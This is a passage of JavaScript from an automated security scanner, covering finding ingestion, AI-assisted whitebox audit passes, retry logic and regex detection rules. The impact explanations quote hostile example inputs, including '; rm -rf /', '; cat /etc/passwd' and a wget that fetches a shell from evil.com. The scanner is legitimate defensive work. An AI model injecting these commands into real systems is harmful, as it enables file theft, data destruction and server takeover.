                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Laravel log file publicly accessible at ${checkUrl} (${text.length} bytes) — discloses application stack traces, queries, and internal state.`,
                remediation: `Block public access to storage logs in web server configuration.`,
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 300) },
              }, { verify })
            } else if (p === '/metrics' && !isHtml && (text.includes('# HELP') || text.includes('# TYPE') || text.includes('jvm_threads_live'))) {
              await this.ingestFinding(scanId, {
                title: `Application Metrics Endpoint Exposed (${p})`,
                severity: 'low',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Prometheus/application metrics publicly accessible at ${checkUrl} — discloses operational statistics.`,
                remediation: `Restrict access to metrics endpoints.`,
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 200) },
              }, { verify })
            } else if (p === '/debug/vars' && !isHtml && text.trim().startsWith('{') && text.includes('"cmdline"')) {
              await this.ingestFinding(scanId, {
                title: `Go Expvar Debug Variables Exposed (${p})`,
                severity: 'medium',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Go debug/vars endpoint exposed at ${checkUrl} disclosing internal runtime variables.`,
                remediation: `Disable expvar in production.`,
                module: 'path-enum',
                evidence: { url: checkUrl },
              }, { verify })
            } else if (p === '/robots.txt' && !isHtml && /user-agent:|disallow:|allow:/i.test(text)) {
              // Deliberately joins the corpus template's robots.txt finding
              // family (see `Robots.txt Sensitive Path Discovery`): both
              // describe the same artefact, so `findingFingerprint` collapses
              // them into one card and the template's severity wins the merge.
              // Emitting a separate `robots.txt Discovered` row here produced
              // a second, near-duplicate entry for every scan.
              await this.ingestFinding(scanId, {
                title: 'Information Disclosure: robots.txt exposes 0 reachable sensitive path(s)',
                severity: 'info',
                cweId: 'CWE-548',
                owaspCategory: 'A05:2025-Security Misconfiguration',
                description: `robots.txt is publicly served at ${checkUrl} and lists restricted crawler directives:\n${text.slice(0, 300)}\n\nNo listed path was confirmed reachable, so this is a disclosure-only observation.`,
                remediation: 'Serve robots.txt without enumerating sensitive locations, and enforce authentication on every path it lists. A Disallow entry is not an access control.',
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 300), count: 0 },
              }, { verify })
            }
          }
        } catch { /* skip */ }
      }
    } // end if (!isSpaCatchAll)

    // 4. Client-side bundle audit. Runs even on SPA catch-all hosts — that is
    // precisely the case path enumeration has to skip, so the bundle is the only
    // place the real attack surface (routes, API calls, tokens) can be observed.
    // Intentional for subdomain cascades too: a subdomain is usually a separate
    // application with its own bundle, and skipping it produced zero JS coverage
    // for the whole host. Guarded by a size cap inside `auditClientBundle`.
    try {
      this.log(scanId, 'info', `▶ Auditing client-side JS bundles on ${targetUrl}...`)
      await this.auditClientBundle(scanId, targetUrl, { verify })
    } catch (err) {
      this.log(scanId, 'warn', `JS bundle audit warning: ${err.message}`)
    }
  }

  /** Parse raw tool stdout into structured findings (heuristic + severity extraction). */
  async processToolOutput(scanId, tool, res, { verify, targetType, target = '' } = {}) {
    // Native-only execution: res is the runNativeTool() result (or a
    // { nativeResult } wrapper from callers that already ran the tool).
    const native = res?.nativeResult || res
    if (!native || (!native.success && !native.stdout)) {
      // Surface the REAL error (exit code + stderr tail) not 'undefined'
      const detail = native?.error || `exit ${native?.code ?? '?'}${native?.stderr ? ` — ${native.stderr.split('\n').slice(-2).join(' | ')}` : ''}`
      this.log(scanId, 'warn', `Tool ${tool} failed: ${detail}`)
      return
    }
    // Structured-output tools (JSON/JSONL on stdout) are parsed from stdout
    // ONLY — stderr carries progress chatter that can leak into the generic
    // keyword heuristics when the structured parser extracts nothing.
    const STRUCTURED_TOOLS = new Set(['nuclei', 'dalfox', 'wpscan', 'katana', 'httpx'])
    const nativeOut = (STRUCTURED_TOOLS.has(tool) ? (native.stdout || '') : `${native.stdout || ''}\n${native.stderr || ''}`).trim()
    if (!nativeOut) {
      this.log(scanId, 'warn', `Tool ${tool} produced no output (exit ${native.code ?? 0}, cmd: ${native.bin || tool} ${native.args || ''})`)
      return
    }
    this.log(scanId, 'info', `📤 [${tool}] raw output (${nativeOut.split('\n').length} lines):\n${nativeOut.slice(0, 2000)}${nativeOut.length > 2000 ? '\n… (truncated)' : ''}`)
    const { findings, discoveredUrls } = extractFindingsFromOutput(tool, nativeOut, target || '', this._catchAllBaselines.get(scanId) || null)
    this._collectUrls(scanId, discoveredUrls)
    if (!findings.length) {
      this.log(scanId, 'info', `🔍 [${tool}] parser extracted 0 findings${discoveredUrls.length ? ` (${discoveredUrls.length} URLs queued for chaining)` : ''}`)
      return
    }
    this.log(scanId, 'info', `🔍 [${tool}] parser extracted ${findings.length} findings — passing to AI verification`)
    for (const f of findings) {
      const declared = SEVERITY_RANK[f.severity] ?? SEVERITY_RANK.info
      const moduleTitle = String(f.title || '')
      const versionOnly = VERSION_ONLY_RE.test(moduleTitle)
      // End-of-life / lifecycle templates are `info` by design: they assert a
      // version string matches a range, not that anything is exploitable. Letting
      // the lifecycle override below promote them to `high` turned every outdated
      // banner into a HIGH finding — that is how a template whose own
      // `info.severity` reads "info" ended up stored as HIGH.
      const treated = (versionOnly && declared <= SEVERITY_RANK.info)
        ? 'info'
        : VERSION_FINDING_MODULES.has(tool)
          ? (declared < SEVERITY_RANK.medium ? 'medium' : f.severity)
          : f.severity
      await this.ingestFinding(scanId, { ...f, severity: treated, module: `native:${tool}` }, { verify, targetType })
    }
  }

  /** Queue discovered URLs for injection chaining (dalfox/sqlmap). */
  _collectUrls(scanId, urls) {
    if (!Array.isArray(urls) || !urls.length) return
    let pool = this._urlPool.get(scanId)
    if (!pool) {
      pool = new Set()
      this._urlPool.set(scanId, pool)
    }
    for (let u of urls) {
      if (typeof u !== 'string' || !/^https?:\/\//i.test(u)) continue
      // SANITIZE: feroxbuster appends content-type suffixes to URLs when
      // parsing its table output (e.g. "/login/.git/<hash>-text/javascript").
      // Strip "-text/javascript", "-application/json", etc. before pooling —
      // these mangled URLs were being classified as auth surfaces and probed.
      u = u.replace(/-[a-z]+\/(?:javascript|json|xml|html|css|plain|x-www-form-urlencoded|octet-stream)(?:;|$|\?)/gi, '')
      // Drop URLs that still look mangled (hash-length junk segments)
      if (/[0-9a-f]{16,}/i.test(u)) continue
      pool.add(u)
    }
  }

  /**
   * Get a snapshot of the URL pool for a scan (used before dalfox/sqlmap chaining).
   * Intentionally does NOT clear the pool: the error-differential fuzzers run
   * before _discoverLoginSurfaces(), which still needs the collected URLs.
   */
  _drainUrls(scanId) {
    const pool = this._urlPool?.get(scanId)
    return pool ? [...pool] : []
  }

  // ── WHITEBOX ───────────────────────────────────────────────────────────────
  async runWhitebox(scan, { files = [], language = '', focus = '', verify = true, depth = 'standard', owaspCategories = [], whiteboxPasses = null } = {}) {    const scanId = scan.id
    this._beginScan(scanId)
    aiEngine.llm.resetUsageTotals()
    // ALWAYS full offensive: pattern scanner + 3 specialist AI passes
    const catLabel = owaspCategories.length ? ` [OWASP: ${owaspCategories.join(',')}]` : ''
    this.log(scanId, 'info', `▶ Whitebox static analysis started (${files.length} files, depth=offensive)${catLabel}`)
    if (!files.length) {
      this.log(scanId, 'warn', 'No source files provided for whitebox analysis')
      this.finish(scanId, 'failed')
      return
    }

    // Store OWASP categories for reference in findings display
    if (owaspCategories.length) {
      try { db.run(`UPDATE scans SET owasp_categories = ? WHERE id = ?`, JSON.stringify(owaspCategories), scanId) } catch { /* non-critical */ }
    }

    // ── Structured whitebox metadata for the "Audit Details" section ──
    const whiteboxMeta = {
      totalFiles: files.length,
      language: language || 'auto-detected',
      filesChecked: files.map(f => ({ path: f.path, size: String(f.content || '').length })),
      passes: [],
    }
    /** Persist whitebox metadata so the frontend can render the Audit Details section. */
    const _saveWhiteboxMeta = () => {
      try {
        db.run(`UPDATE scans SET whitebox_meta = ? WHERE id = ?`, JSON.stringify(whiteboxMeta), scanId)
      } catch { /* non-critical */ }
    }

    try {
      let totalStored = 0
      this.progress(scanId, 2)

      // PASS 0: fast deterministic pattern scan (no AI) — always runs
      const patStart = Date.now()
      this.log(scanId, 'info', '⚔️ Pattern scanner: secrets / dangerous functions / insecure config...')
      const patFindings = this._patternScan(files)
      const patMs = Date.now() - patStart
      this.log(scanId, 'info', `⚔️ Pattern scanner produced ${patFindings.length} candidates (${(patMs / 1000).toFixed(1)}s)`)
      whiteboxMeta.passes.push({ tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' })
      _saveWhiteboxMeta()
      let done = 0
      for (const f of patFindings) {
        await this.waitIfPaused(scanId)
        const stored = await this.ingestFinding(scanId, f, { verify, targetType: 'code' })
        if (stored) totalStored++
        done++
        if (patFindings.length) this.progress(scanId, 2 + (done / patFindings.length) * 13)
      }
      this.progress(scanId, 15)

      // 3 specialist AI audit passes — always runs unless filtered by OWASP categories
      const allPasses = [
        { tag: 'injection', focus: `${focus || 'security'} — focus EXCLUSIVELY on injection flaws: SQL injection, command injection, XSS, template injection, LDAP/XPath injection, unsafe eval/exec/deserialization. Trace user input to sinks.`, owaspCats: ['A05'] },
        { tag: 'auth-secrets', focus: `${focus || 'security'} — focus EXCLUSIVELY on broken authentication, session management, JWT misuse, hardcoded credentials/secrets/API keys, weak crypto, insecure password storage, missing rate limiting.`, owaspCats: ['A04', 'A07'] },
        { tag: 'logic-config', focus: `${focus || 'security'} — focus EXCLUSIVELY on business-logic flaws, broken access control (IDOR, missing authz checks), SSRF, path traversal, file upload, CORS misconfiguration, security headers, debug endpoints left enabled.`, owaspCats: ['A01', 'A02', 'A03', 'A06', 'A08', 'A09', 'A10'] },
      ]
      // Filter passes by OWASP categories if provided
      const passes = whiteboxPasses
        ? allPasses.filter(p => {
            if (whiteboxPasses.includes('pattern')) return true
            return whiteboxPasses.includes(p.tag)
          })
        : allPasses

      // AI passes span 15% → 97%
      const aiStart = 15, aiEnd = 97
      for (let pi = 0; pi < passes.length; pi++) {
        const p = passes[pi]
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `🤖 AI audit pass: ${p.tag}`)
        const passBase = aiStart + (pi / passes.length) * (aiEnd - aiStart)
        this.progress(scanId, passBase)

        const aiPassStart = Date.now()
        try {
          // Safety timeout of 120 seconds per AI pass to ensure scan never hangs.
          // Large codebases (100+ files) need more time for LLM analysis.
          const passPromise = aiEngine.auditCode(files, { language, focus: p.focus })
          const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Pass timed out after 120s')), 120000))
          const { agent, findings } = await Promise.race([passPromise, timeoutPromise])
          const aiMs = Date.now() - aiPassStart

          this.log(scanId, 'info', `🤖 [${agent}] ${p.tag} pass produced ${findings.length} candidate findings (${(aiMs / 1000).toFixed(1)}s)`)
          whiteboxMeta.passes.push({ tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' })
          _saveWhiteboxMeta()
          let done = 0
          for (const f of findings) {
            await this.waitIfPaused(scanId)
            const stored = await this.ingestFinding(scanId, {
              title: f.title,
              severity: f.severity,
              cweId: f.cwe,
              owaspCategory: f.owasp,
              description: `${f.description}${f.file ? ` (in ${f.file}${f.line ? `:${f.line}` : ''})` : ''}`,
              remediation: f.remediation,
              module: `code-audit:${agent}:${p.tag}`,
              evidence: { file: f.file, line: f.line, code: f.evidence },
            }, { verify, targetType: 'code' })
            if (stored) totalStored++
            done++
            if (findings.length) this.progress(scanId, passBase + (done / findings.length) * ((aiEnd - aiStart) / passes.length))
          }
        } catch (e) {
          const aiMs = Date.now() - aiPassStart
          this.log(scanId, 'warn', `⚠️ AI audit pass ${p.tag} failed: ${e.message}`)
          whiteboxMeta.passes.push({ tool: 'AI engine', type: p.tag, findings: 0, durationMs: aiMs, status: 'failed', error: e.message })
          _saveWhiteboxMeta()
        }
      }

      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Whitebox audit warning: ${e.message}`)
      this.finish(scanId, 'failed')
    }
  }

  /**
   * Retry only the FAILED passes from the previous whitebox scan.
   * Reads whitebox_meta to find which passes failed, then re-runs them.
   * If the pattern scanner also failed (unlikely), re-runs it too.
   */
  async retryFailedWhitebox(scan, { files = [], language = '', focus = '', verify = true } = {}) {
    const scanId = scan.id
    this._beginScan(scanId)
    this.log(scanId, 'info', `🔁 Retrying failed whitebox passes on ${files.length} files...`)

    // Load previous metadata to find failed passes
    let prevMeta = { passes: [], totalFiles: files.length }
    try {
      const row = db.get(`SELECT whitebox_meta FROM scans WHERE id = ?`, scanId)
      if (row?.whitebox_meta) prevMeta = JSON.parse(row.whitebox_meta)
    } catch { /* use defaults */ }

    const failedPasses = (prevMeta.passes || []).filter(p => p.status === 'failed')
    if (!failedPasses.length) {
      this.log(scanId, 'info', 'No failed passes to retry — all passes completed successfully')
      this.finish(scanId, 'completed')
      return
    }
    this.log(scanId, 'info', `Found ${failedPasses.length} failed pass(es) to retry: ${failedPasses.map(p => p.type).join(', ')}`)

    // Build the whitebox metadata for this retry (append to existing)
    let existingMeta = prevMeta
    try {
      const row = db.get(`SELECT whitebox_meta FROM scans WHERE id = ?`, scanId)
      if (row?.whitebox_meta) existingMeta = JSON.parse(row.whitebox_meta)
    } catch { existingMeta = prevMeta }

    const _saveWhiteboxMeta = () => {
      try { db.run(`UPDATE scans SET whitebox_meta = ? WHERE id = ?`, JSON.stringify(existingMeta), scanId) } catch { }
    }

    // Map of all 3 pass definitions
    const ALL_PASSES = {
      'injection': { tag: 'injection', focus: `${focus || 'security'} — focus EXCLUSIVELY on injection flaws: SQL injection, command injection, XSS, template injection, LDAP/XPath injection, unsafe eval/exec/deserialization. Trace user input to sinks.` },
      'auth-secrets': { tag: 'auth-secrets', focus: `${focus || 'security'} — focus EXCLUSIVELY on broken authentication, session management, JWT misuse, hardcoded credentials/secrets/API keys, weak crypto, insecure password storage, missing rate limiting.` },
      'logic-config': { tag: 'logic-config', focus: `${focus || 'security'} — focus EXCLUSIVELY on business-logic flaws, broken access control (IDOR, missing authz checks), SSRF, path traversal, file upload, CORS misconfiguration, security headers, debug endpoints left enabled.` },
    }

    try {
      let totalStored = 0
      // Re-run pattern scanner only if it's marked as failed
      const patFailed = failedPasses.find(p => p.type === 'deterministic')
      if (patFailed) {
        this.progress(scanId, 2)
        const patStart = Date.now()
        this.log(scanId, 'info', '⚔️ Retrying: Pattern scanner...')
        const patFindings = this._patternScan(files)
        const patMs = Date.now() - patStart
        this.log(scanId, 'info', `⚔️ Pattern scanner produced ${patFindings.length} candidates (${(patMs / 1000).toFixed(1)}s)`)
        // Update the existing pass entry
        const idx = existingMeta.passes.findIndex(p => p.type === 'deterministic' && p.status === 'failed')
        if (idx >= 0) existingMeta.passes[idx] = { tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' }
        else existingMeta.passes.push({ tool: 'Pattern Scanner', type: 'deterministic', findings: patFindings.length, durationMs: patMs, status: 'completed' })
        _saveWhiteboxMeta()
        let done = 0
        for (const f of patFindings) {
          await this.waitIfPaused(scanId)
          const stored = await this.ingestFinding(scanId, f, { verify, targetType: 'code' })
          if (stored) totalStored++
          done++
          if (patFindings.length) this.progress(scanId, 2 + (done / patFindings.length) * 13)
        }
      }
      this.progress(scanId, 15)

      // Re-run only failed AI passes
      const aiFailed = failedPasses.filter(p => p.type !== 'deterministic')
      const aiStart = 15, aiEnd = 97
      for (let pi = 0; pi < aiFailed.length; pi++) {
        const failed = aiFailed[pi]
        const p = ALL_PASSES[failed.type]
        if (!p) {
          this.log(scanId, 'warn', `Unknown pass type "${failed.type}" — skipping`)
          continue
        }
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `🤖 Retrying AI audit pass: ${p.tag}`)
        const passBase = aiStart + (pi / aiFailed.length) * (aiEnd - aiStart)
        this.progress(scanId, passBase)

        const aiPassStart = Date.now()
        try {
          const passPromise = aiEngine.auditCode(files, { language, focus: p.focus })
          const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Pass timed out after 120s')), 120000))
          const { agent, findings } = await Promise.race([passPromise, timeoutPromise])
          const aiMs = Date.now() - aiPassStart

          this.log(scanId, 'info', `🤖 [${agent}] ${p.tag} retry produced ${findings.length} candidate findings (${(aiMs / 1000).toFixed(1)}s)`)
          // Update the existing failed pass entry
          const idx = existingMeta.passes.findIndex(e => e.type === p.tag && e.status === 'failed')
          if (idx >= 0) existingMeta.passes[idx] = { tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' }
          else existingMeta.passes.push({ tool: agent, type: p.tag, findings: findings.length, durationMs: aiMs, status: 'completed' })
          _saveWhiteboxMeta()
          let done = 0
          for (const f of findings) {
            await this.waitIfPaused(scanId)
            const stored = await this.ingestFinding(scanId, {
              title: f.title,
              severity: f.severity,
              cweId: f.cwe,
              owaspCategory: f.owasp,
              description: `${f.description}${f.file ? ` (in ${f.file}${f.line ? `:${f.line}` : ''})` : ''}`,
              remediation: f.remediation,
              module: `code-audit:${agent}:${p.tag}`,
              evidence: { file: f.file, line: f.line, code: f.evidence },
            }, { verify, targetType: 'code' })
            if (stored) totalStored++
            done++
            if (findings.length) this.progress(scanId, passBase + (done / findings.length) * ((aiEnd - aiStart) / aiFailed.length))
          }
        } catch (e) {
          const aiMs = Date.now() - aiPassStart
          this.log(scanId, 'warn', `⚠️ AI retry pass ${p.tag} still failed: ${e.message}`)
          const idx = existingMeta.passes.findIndex(e => e.type === p.tag && e.status === 'failed')
          if (idx >= 0) existingMeta.passes[idx] = { ...existingMeta.passes[idx], durationMs: (existingMeta.passes[idx].durationMs || 0) + aiMs, error: e.message }
          _saveWhiteboxMeta()
        }
      }

      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Retry failed whitebox warning: ${e.message}`)
      this.finish(scanId, 'failed')
    }
  }

  /**
   * Retry only the FAILED native tools from a blackbox scan.
   * Parses logs for "Tool X failed natively" messages to identify failed tools.
   */
  async retryFailedBlackbox(scan, { verify = true, modules = [] } = {}) {
    const scanId = scan.id
    const target = scan.target
    this._beginScan(scanId)
    this.log(scanId, 'info', `🔁 Retrying failed blackbox tools on ${target}...`)

    const failedTools = new Set()

    // 1. Check scan.blackbox_meta saved JSON for tools marked as status: 'failed'
    try {
      if (scan.blackbox_meta) {
        const meta = JSON.parse(scan.blackbox_meta)
        if (Array.isArray(meta.tools)) {
          for (const t of meta.tools) {
            if (t.status === 'failed' || t.error) failedTools.add(t.tool)
          }
        }
      }
    } catch { /* ignore parse error */ }

    // 2. Also check logs for regex matches like "Tool X failed natively" or "Tool X failed"
    const logs = db.all(`SELECT message FROM logs WHERE scan_id = ? ORDER BY id`, scanId)
    for (const l of logs) {
      // Batch failures are logged as "Tool X error: …" (Promise.allSettled) and
      // native failures as "Tool X failed …", so both wordings must match here —
      // previously only the latter did, hiding every rejected-batch tool from retry.
      const m = l.message.match(/Tool (\S+)\s+(?:failed|errored|error)/i)
      if (m && m[1]) failedTools.add(m[1])
    }

    if (!failedTools.size) {
      this.log(scanId, 'info', 'No failed tools detected — nothing to retry')
      this.finish(scanId, 'completed')
      return
    }

    const tools = [...failedTools]
    this.log(scanId, 'info', `Found ${tools.length} failed tool(s) to retry: ${tools.join(', ')}`)

    try {
      // Re-initialize blackboxMeta object for tracking status. The persisted blob
      // is the source of truth for names/subdomains/urls; the literal above is only
      // the fallback when the column is empty, otherwise a retry that ran before any
      // scan-stage write would overwrite the real inventory with an empty schema.
      let meta = { tools: [], subdomains: [], urls: [], totalUrls: 0 }
      try {
        if (scan.blackbox_meta) meta = Object.assign(meta, JSON.parse(scan.blackbox_meta))
      } catch { }
      if (!Array.isArray(meta.tools)) meta.tools = []
      if (!Array.isArray(meta.subdomains)) meta.subdomains = []
      if (!Array.isArray(meta.urls)) meta.urls = []
      if (typeof meta.totalUrls !== 'number') meta.totalUrls = meta.urls.length
      this._blackboxMeta.set(scanId, meta)

      let done = 0
      for (const tool of tools) {
        await this.waitIfPaused(scanId)
        this.log(scanId, 'info', `▶ Retrying: ${tool}\n$ ${previewNativeCommand(tool, target)}`)
        try {
          const res = await runNativeTool(tool, target, { owner: scanId })
          // Update status in metadata
          if (Array.isArray(meta.tools)) {
            const idx = meta.tools.findIndex(t => t.tool === tool)
            const updatedItem = {
              tool,
              status: (res.success || res.stdout) ? 'ok' : 'failed',
              error: (res.success || res.stdout) ? null : (res.error || 'Execution failed'),
              durationMs: res.durationMs || 0
            }
            if (idx >= 0) meta.tools[idx] = updatedItem
            else meta.tools.push(updatedItem)
          }
          await this.processToolOutput(scanId, tool, res, { verify, targetType: scan.target_type, target })
        } catch (e) {
          this.log(scanId, 'warn', `Retry ${tool} still failed: ${e.message}`)
        }
        done++
        this.progress(scanId, 25 + (done / tools.length) * 75)
      }

      // Save updated blackbox_meta back to DB
      db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(meta), scanId)
      this.progress(scanId, 100)
      this.finish(scanId, 'completed')
    } catch (e) {
      this.log(scanId, 'error', `Retry blackbox warning: ${e.message}`)
      this.finish(scanId, 'failed')
    }
  }

  /**
   * Deterministic pattern scanner — no AI. Matches known-bad code patterns:
   * hardcoded secrets, dangerous function calls, insecure configuration.
   * Every finding is grounded in an exact code line (file + line number).
   */
  _patternScan(files) {
    // ── Layman-impact explanations per vulnerability category ──
    const IMPACT = {
      'A05:2025-Injection': 'An attacker can inject malicious commands or code into the application. For SQL injection, this means reading/modifying/deleting the entire database — including stealing all user passwords, credit card numbers, and private data. For command injection, the attacker can run any command on the server, potentially taking full control of the machine.',
      'A01:2025-Broken Access Control': 'A normal user can access someone else\'s data or perform admin-only actions just by changing a number in the URL (e.g. /user/1 → /user/2). An attacker can view, modify, or delete other users\' private information, or escalate to admin privileges without authorization.',
      'A04:2025-Cryptographic Failures': 'Sensitive data like passwords, session tokens, or personal information is not properly protected. An attacker who intercepts network traffic or gains access to the database can read passwords in plain text, impersonate users, or decrypt supposedly secure communications.',
      'A06:2025-Insecure Design': 'The application lacks proper security controls by design. Missing rate limiting allows attackers to try thousands of passwords per second. Missing validation allows malicious file uploads or impossible data values. These are structural flaws that cannot be fixed by patching a single line of code.',
      'A02:2025-Security Misconfiguration': 'The server or application is set up insecurely. Debug pages leak internal paths and secrets. Default admin passwords are still in use. Unnecessary features are enabled. CORS misconfiguration allows any website to make authenticated requests on behalf of your users. An attacker can exploit these oversights to gain deeper access.',
      'A03:2025-Software Supply Chain Failures': 'The application uses libraries or frameworks with known security vulnerabilities. Attackers can use publicly available exploits to compromise the application without needing to find a new vulnerability — they just run an existing attack script.',
      'A07:2025-Authentication Failures': 'The login system is weak. An attacker can brute-force passwords (try thousands of combinations until one works), use default credentials (admin/admin), or steal session tokens to impersonate legitimate users. Without multi-factor authentication, a single leaked password grants full access.',
      'A08:2025-Software or Data Integrity Failures': 'The application trusts external data without verification. Unsafe deserialization lets attackers send crafted data that executes code when the application reads it. An attacker can achieve remote code execution by uploading a malicious serialized object or tampering with a software update.',
      'A09:2025-Security Logging and Alerting Failures': 'No one is watching for attacks. Without proper logging, a breach can go undetected for months. Attackers can brute-force passwords, exfiltrate data, or maintain persistent access without triggering any alerts. There is no audit trail to investigate what happened after an incident.',
      'A10:2025-Mishandling of Exceptional Conditions': 'The application fails to handle unexpected errors or exceptional conditions safely. Attackers can trigger unhandled exceptions to crash the service (Denial of Service), expose internal system paths and database schemas in stack traces, or bypass authentication logic when errors cause security checks to fail open.',
    }

    // Helper: check if rule applies to this file based on extension
    const extMatch = (f, exts) => exts.some(e => f.path.toLowerCase().endsWith(e))
    const ALL = () => true // applies to all files

    const RULES = [
      // ── A05:2025 — Injection (SQLi, CMDi, XSS, SSTI, LDAP, NoSQL, XPath) ──
      { re: /(?:api[_-]?key|apikey|secret|password|passwd|token|private[_-]?key)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Hardcoded secret/credential', owasp: 'A07:2025-Authentication Failures', impact: 'A secret key or password is written directly in the source code. Anyone who can read the code — including attackers who gain access to the repository — can use this credential to access the database, API, or service it protects. If this code is in a public GitHub repo, the credential is already compromised.', ext: ALL },
      { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/, sev: 'critical', cwe: 'CWE-798', title: 'Private key committed to source', owasp: 'A07:2025-Authentication Failures', impact: 'A private cryptographic key is stored in the source code. This key can decrypt all communications, sign malicious software as trusted, or authenticate as the server to steal data. Anyone with this key can impersonate the application.', ext: ALL },
      // SQL Injection patterns (only on files that actually do DB queries)
      { re: /(?:query|execute|raw|queryRunner|getConnection|createQuery|createQueryBuilder)\s*\(\s*[`'"].*\$[\{\(]/, sev: 'high', cwe: 'CWE-89', title: 'SQL query built with string interpolation (SQLi risk)', owasp: 'A05:2025-Injection', impact: 'Database queries are built by directly inserting user input into the SQL string. An attacker can close the quote and add their own SQL commands — reading the entire database, modifying records, or deleting all data. This is the #1 most dangerous web vulnerability.', ext: ALL },
      // Only taint-tracking-based DB/query call. A bare `.query(` is far too
      // generic — it also matches GraphQL clients (client.query({ query: … })),
      // TanStack/React Query, and knex-style builders — so require a known DB
      // receiver, or the raw/execute/queryRunner family used for raw SQL.
      { re: /(?:\.|\b)(?:db|conn|connection|pool|knex|sequelize|prisma|mysql|pg|sqlite|sql|database)\.query\s*\(\s*(?!['"][^'"]*['"]\s*,\s*\[)|(?:db|conn|connection|pool|knex|sequelize|prisma|mysql|pg|sqlite|sql|database)\.(?:raw|execute|queryRunner|createQuery|createQueryBuilder)\s*\(\s*(?!['"][^'"]*['"]\s*,\s*\[)/, sev: 'medium', cwe: 'CWE-89', title: 'Database query without parameterized binding', owasp: 'A05:2025-Injection', impact: 'The query does not appear to use parameterized/placeholder binding. If user input reaches this query, it is vulnerable to SQL injection — attackers can extract, modify, or destroy database contents.', ext: ALL },
      { re: /mysql_query\s*\(\s*['"][^'"]*\$_(?:GET|POST|REQUEST)/, sev: 'critical', cwe: 'CWE-89', title: 'PHP SQL injection (mysql_query with superglobal)', owasp: 'A05:2025-Injection', impact: 'PHP code directly inserts user input ($_GET/$_POST) into a MySQL query string. An attacker can craft a URL parameter that extracts the entire database, including all user passwords and private data. This is trivially exploitable.', ext: f => extMatch(f, ['.php']) },
      { re: /(?:select|insert|update|delete)\s+.*\+.*\b(?:req|request|params|query|body|input|param)\b/i, sev: 'high', cwe: 'CWE-89', title: 'SQL statement concatenated with user input', owasp: 'A05:2025-Injection', impact: 'An SQL query string is built by concatenating (+) with user-supplied data. Attackers can inject SQL commands to read all database tables, modify records, or drop the entire database.', ext: ALL },
      // Command Injection patterns
      { re: /\b(?:eval|exec|execSync|execFileSync|spawnSync|child_process\.exec|subprocess\.(?:call|check_output|Popen)|os\.(?:system|popen))\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)/, sev: 'high', cwe: 'CWE-78', title: 'Command execution with user-controlled input', owasp: 'A05:2025-Injection', impact: 'User input is passed directly to a system command. An attacker can inject shell commands (e.g., ; rm -rf / or ; cat /etc/passwd) to execute arbitrary code on the server, read sensitive files, or take full control of the machine.', ext: ALL },
      { re: /\beval\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'eval() usage — possible code injection', owasp: 'A05:2025-Injection', impact: 'eval() executes a string as code. If any part of that string comes from user input, an attacker can run arbitrary JavaScript/Python on the server — accessing files, databases, environment variables, and escalating to full server compromise.', ext: ALL },
      { re: /new\s+Function\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'new Function() — dynamic code execution', owasp: 'A05:2025-Injection', impact: 'new Function() creates and runs code from a string, similar to eval(). If user input reaches this, attackers can execute arbitrary JavaScript with full access to the application context.', ext: ALL },
      { re: /shell_exec|passthru|system|popen|proc_open|exec\s*\(\s*\$_(?:GET|POST|REQUEST)/, sev: 'high', cwe: 'CWE-78', title: 'PHP command execution with user input', owasp: 'A05:2025-Injection', impact: 'PHP code passes user input directly to a shell command. An attacker can append ; cat /etc/passwd or ; wget http://evil.com/shell.php to run any command on the server with the web server\'s privileges.', ext: f => extMatch(f, ['.php']) },
      { re: /(?:require|include)(?:_once)?\s*\(?\s*['"]?[^'"]*\$_(?:GET|POST|REQUEST)/, sev: 'high', cwe: 'CWE-98', title: 'PHP remote/local file inclusion via user input', owasp: 'A05:2025-Injection', impact: 'PHP code passes user input ($_GET/$_POST) directly into a require/include statement. An attacker can supply a malicious path to execute arbitrary local or remote PHP code.', ext: f => extMatch(f, ['.php']) },
      { re: /require\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-98', title: 'Dynamic require() with user input (LFI / code execution risk)', owasp: 'A05:2025-Injection', impact: 'User input controls which module or file is loaded via require(). An attacker can supply arbitrary paths to execute unintended code or disclose local files.', ext: f => extMatch(f, ['.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs']) },
      // XSS patterns
      { re: /innerHTML\s*=\s*(?!['"]<)/, sev: 'medium', cwe: 'CWE-79', title: 'innerHTML assignment — DOM XSS risk', owasp: 'A05:2025-Injection', impact: 'Setting innerHTML with untrusted data allows attackers to inject <script> tags that run in victims\' browsers. This can steal login cookies, redirect users to phishing sites, or deface the page. Any user visiting the page could have their account hijacked.', ext: ALL },
      { re: /dangerouslySetInnerHTML/, sev: 'medium', cwe: 'CWE-79', title: 'React dangerouslySetInnerHTML — XSS risk', owasp: 'A05:2025-Injection', impact: 'React\'s dangerouslySetInnerHTML bypasses React\'s built-in XSS protection. If the content comes from user input, attackers can inject scripts that steal session tokens, log keystrokes, or perform actions as the victim.', ext: ALL },
